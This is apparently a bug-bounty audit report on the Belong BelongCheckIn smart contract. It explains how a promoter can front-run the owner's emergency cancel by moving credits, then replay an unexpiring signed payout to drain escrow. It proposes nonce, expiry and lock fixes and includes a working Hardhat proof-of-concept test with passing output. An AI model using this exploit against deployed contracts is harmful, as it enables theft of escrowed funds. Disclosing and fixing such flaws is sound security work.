# 57558 sc low front running issue in emergencycancelpayment&#x20;

**Submitted on Oct 27th 2025 at 08:58:37 UTC by @iehnnkta for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57558
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/BelongCheckIn.sol>
* **Impacts:** Theft of unclaimed yield

## Description

### Brief/Intro

The owner-only `emergencyCancelPayment(venue, promoter)` is intended to claw back a promoter’s outstanding credits to the venue. If the promoter credits are transferable, the promoter can front‑run the owner’s cancel by transferring credits to another address, making the cancel call a silent no‑op (burn/mint of 0) without reverting.

### Vulnerability Details

Flow:

{% stepper %}
{% step %}

### Step: Alice mints venue credits

Alice mints 100 venue credits.
{% endstep %}

{% step %}

### Step: Bob mints promoter credits

Bob mints 50 promoter credits; and mints another 2 promoter credits with a proxy account. Backend signs a 2‑credit payout for proxy account.
{% endstep %}

{% step %}

### Step: Owner triggers emergency cancel

Owner suspects Bob1 and calls `emergencyCancelPayment(venue, Bob1)`.
{% endstep %}

{% step %}

### Step: Promoter front‑runs

Bob front‑runs by transferring 50 credits from Bob → Bob's proxy account.
{% endstep %}

{% step %}

### Step: Cancel becomes a no‑op

When the owner tx executes, `promoterBalance(Bob) == 0`, so `emergencyCancelPayment` burns 0 and mints 0; it does not revert or restore any credits. Combined with signature replay, Bob's proxy account (now holding 52 credits) replays the same signed payout in a loop to withdraw all 52 credits from escrow.
{% endstep %}
{% endstepper %}

Root Cause:

* `emergencyCancelPayment` reads the live promoter balance and unconditionally burns that amount, lacking a `require(promoterBalance > 0)` or `expectedAmount` parameter.
* `distributePromoterPayments` has no nonce/expiry, allowing the same backend signature to be replayed multiple times.

Final Result — Bob's proxy account, now holding the transferred credits, can replay the signed payout multiple times to drain the escrow.

### Impact Details

* Owner’s cancellation can be bypassed by transferring credits to another address prior to cancellation.
* With signature replayability, an attacker can drain escrow by repeatedly redeeming the same signed payout (example: 52 USDC in the PoC).
* Severity (author): High (loss of funds and failure of admin control).

## References

<https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/platform/BelongCheckIn.sol#L562-L573>

## Mitigation

{% stepper %}
{% step %}

### Address signature replay

Add nonce/expiry to the backend-signed promoter payout messages so each signature can only be used once or before a deadline.
{% endstep %}

{% step %}

### Hardening emergency cancellation against front‑running

Ensure `emergencyCancelPayment` cannot be trivially bypassed by transfers:

* Consider requiring an expected amount parameter or verifying promoter balance at signature generation time.
* Alternatively, add time-based locks on promoter withdrawals after a cancel is initiated, or check that the promoter still owns expected credits before burning/minting.
  {% endstep %}
  {% endstepper %}

## Proof of Concept

<details>

<summary>PoC test: emergencyCancelPayment front-run + signature replay drains escrow (add to belong-check-in-bsc-fork.test.ts)</summary>

```
  it('exploit: emergencyCancelPayment front-run + signature replay drains escrow', async () => {
    const {
      belongCheckIn,
      helper,
      escrow,
      factory,
      admin,
      signer,
      referralCode,
      USDC,
      USDC_whale: alice,
      manager: bob1,
      pauser: bob2,
    } = await loadFixture(fixture);

    // Redeploy credit tokens with promoter token transferable so Bob can front-run by transferring credits
    const { venueToken: newVenueToken, promoterToken: newPromoterToken } = await deployCreditTokens(
      true, // venue transferable (irrelevant here)
      true, // promoter transferable (needed for front-run transfer)
      factory.address,
      signer.privateKey,
      admin,
      belongCheckIn.address, // manager
      belongCheckIn.address, // minter
      belongCheckIn.address, // burner
      { name: 'VenueToken2', symbol: 'VET2', uri: 'contractURI/VenueToken2' },
      { name: 'PromoterToken2', symbol: 'PMT2', uri: 'contractURI/PromoterToken2' }
    );

    // Wire new tokens into BelongCheckIn
    const current = await belongCheckIn.contracts();
    await belongCheckIn.setContracts({
      factory: current.factory,
      escrow: current.escrow,
      staking: current.staking,
      venueToken: newVenueToken.address,
      promoterToken: newPromoterToken.address,
      longPF: current.longPF,
    });

    // 1) Alice deposits 100 USDC → mints 100 venue credits
    const chainId = 31337;
    const uri = 'uriuri';
    const amount100 = await u(100, USDC);
    const venueMsg = ethers.utils.solidityKeccak256(
      ['address', 'bytes32', 'string', 'uint256'],
      [alice.address, referralCode, uri, chainId]
    );
    const venueSig = EthCrypto.sign(signer.privateKey, venueMsg);
    const venueInfo: VenueInfoStruct = {
      rules: { paymentType: 1, bountyType: 1, longPaymentType: 0 } as VenueRulesStruct, // USDC, VisitBounty
      venue: alice.address,
      amount: amount100,
      referralCode,
      uri,
      signature: venueSig,
    };
    const paymentToAffiliate = await helper.calculateRate(
      (await belongCheckIn.belongCheckInStorage()).fees.affiliatePercentage,
      amount100,
    );
    const willBeTaken = convenienceFeeAmount.add(amount100).add(paymentToAffiliate);
    await USDC.connect(alice).approve(belongCheckIn.address, willBeTaken);
    await belongCheckIn.connect(alice).venueDeposit(venueInfo);

    const venueId = await helper.getVenueId(alice.address);

    // 2) Bob1 buys 50 promoter credits (pays 50 USDC, burns 50 venue credits)
    const amt50 = await u(50, USDC);
    const custMsg1 = ethers.utils.solidityKeccak256(
      ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
      [true, amt50, 0, bob1.address, alice.address, bob1.address, amt50, chainId]
    );
    const custSig1 = EthCrypto.sign(signer.privateKey, custMsg1);
    const info1: CustomerInfoStruct = {
      paymentInUSDC: true,
      visitBountyAmount: amt50,
      spendBountyPercentage: 0,
      customer: bob1.address,
      venueToPayFor: alice.address,
      promoter: bob1.address,
      amount: amt50,
      signature: custSig1,
    };
    await USDC.connect(alice).transfer(bob1.address, amt50);
    await USDC.connect(bob1).approve(belongCheckIn.address, amt50);
    await belongCheckIn.connect(bob1).payToVenue(info1);

    // Bob2 buys 2 promoter credits (pays 2 USDC, burns 2 venue credits)
    const amt2 = await u(2, USDC);
    const custMsg2 = ethers.utils.solidityKeccak256(
      ['bool', 'uint128', 'uint24', 'address', 'address', 'address', 'uint256', 'uint256'],
      [true, amt2, 0, bob2.address, alice.address, bob2.address, amt2, chainId]
    );
    const custSig2 = EthCrypto.sign(signer.privateKey, custMsg2);
    const info2: CustomerInfoStruct = {
      paymentInUSDC: true,
      visitBountyAmount: amt2,
      spendBountyPercentage: 0,
      customer: bob2.address,
      venueToPayFor: alice.address,
      promoter: bob2.address,
      amount: amt2,
      signature: custSig2,
    };
    await USDC.connect(alice).transfer(bob2.address, amt2);
    await USDC.connect(bob2).approve(belongCheckIn.address, amt2);
    await belongCheckIn.connect(bob2).payToVenue(info2);

    // Sanity: promoter balances
    expect(await newPromoterToken.balanceOf(bob1.address, venueId)).to.eq(amt50);
    expect(await newPromoterToken.balanceOf(bob2.address, venueId)).to.eq(amt2);

    // 3) Backend signs a payout for Bob2: 2 credits in USDC
    const promoMsg = ethers.utils.solidityKeccak256(
      ['address', 'address', 'uint256', 'uint256'],
      [bob2.address, alice.address, amt2, chainId]
    );
    const promoSig = EthCrypto.sign(signer.privateKey, promoMsg);
    const promoterInfo: PromoterInfoStruct = {
      paymentInUSDC: true,
      promoter: bob2.address,
      venue: alice.address,
      amountInUSD: amt2,
      signature: promoSig,
    };

    // 4) Owner calls emergencyCancelPayment for bob1, but bob1 front-runs by transferring 50 to bob2
    await newPromoterToken
      .connect(bob1)
      .safeTransferFrom(bob1.address, bob2.address, venueId, amt50, '0x');

    const beforeCancelBob1 = await newPromoterToken.balanceOf(bob1.address, venueId);
    const beforeCancelBob2 = await newPromoterToken.balanceOf(bob2.address, venueId);

    // Should not revert; but effectively does nothing since bob1 moved the balance
    await belongCheckIn.connect(admin).emergencyCancelPayment(alice.address, bob1.address);

    expect(beforeCancelBob1).to.eq(0);
    expect(await newPromoterToken.balanceOf(bob2.address, venueId)).to.eq(beforeCancelBob2);

    // 5) Bob2 replays the same signed payout 26 times to drain 52 credits (no nonce/expiry)
    const depositsBefore = (await escrow.venueDeposits(alice.address)).usdcDeposits;

    for (let i = 0; i < 26; i++) {
      await belongCheckIn.connect(bob2).distributePromoterPayments(promoterInfo);
    }

    // All 52 credits claimed by Bob2 (2 initial + 50 transferred)
    expect(await newPromoterToken.balanceOf(bob2.address, venueId)).to.eq(0);

    const depositsAfter = (await escrow.venueDeposits(alice.address)).usdcDeposits;
    expect(depositsBefore.sub(amt2.mul(26))).to.eq(depositsAfter);
  });
```

</details>

<details>

<summary>PoC test run output</summary>

```
$ npx hardhat test test/v2/platform/belong-check-in-bsc-fork.test.ts --grep "signature replay drains escrow"
secp256k1 unavailable, reverting to browser version


  BelongCheckIn BSC PancakeSwap
Warning: Potentially unsafe deployment of contracts/v2/platform/Factory.sol:Factory

    You are using the `unsafeAllow.external-library-linking` flag to include external libraries.
    Make sure you have manually checked that the linked libraries are upgrade safe.

Warning: Potentially unsafe deployment of contracts/v2/platform/Factory.sol:Factory

    You are using the `unsafeAllow.constructor` flag.

Warning: Potentially unsafe deployment of contracts/v2/periphery/Staking.sol:Staking

    You are using the `unsafeAllow.constructor` flag.

Warning: Potentially unsafe deployment of contracts/v2/platform/BelongCheckIn.sol:BelongCheckIn

    You are using the `unsafeAllow.external-library-linking` flag to include external libraries.
    Make sure you have manually checked that the linked libraries are upgrade safe.

Warning: Potentially unsafe deployment of contracts/v2/platform/BelongCheckIn.sol:BelongCheckIn

    You are using the `unsafeAllow.constructor` flag.

Warning: Potentially unsafe deployment of contracts/v2/periphery/Escrow.sol:Escrow

    You are using the `unsafeAllow.constructor` flag.

    ✔ exploit: emergencyCancelPayment front-run + signature replay drains escrow (17892ms)

  1 passing (22s)
```

</details>
